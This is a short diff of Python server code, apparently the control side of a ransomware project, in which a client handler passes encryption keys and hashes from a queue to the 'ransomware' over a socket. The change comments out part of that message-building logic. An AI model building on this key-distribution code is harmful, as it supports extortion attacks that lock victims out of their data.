@@ -76,6 +76,7 @@ def handle_client(socket_client):
         else:
             while not serv_cles_queue.empty():
                 message_to_ransomware = serv_cles_queue.get()
+                """print("Message à envoyer : ", message_to_ransomware)
                 CONFIG_WORKSTATION['KEY'] = message_to_ransomware['KEY']
                 print(CONFIG_WORKSTATION['KEY'])
 
@@ -83,9 +84,9 @@ def handle_client(socket_client):
                 print(CONFIG_WORKSTATION['HASH'])
 
                 # Passer CONFIG_WORKSTATION en argument à set_message
-                message_for_ransomware = message.set_message("CONFIGURE", CONFIG_WORKSTATION)
-                network.send_message(socket_client, message_for_ransomware)
-                print("Message envoyé : ", message_for_ransomware)
+                message_to_ransomware = message.set_message("CONFIGURE", CONFIG_WORKSTATION)"""
+                network.send_message(socket_client, message_to_ransomware)
+                print("Message envoyé : ", message_to_ransomware)
 
 
 def main():
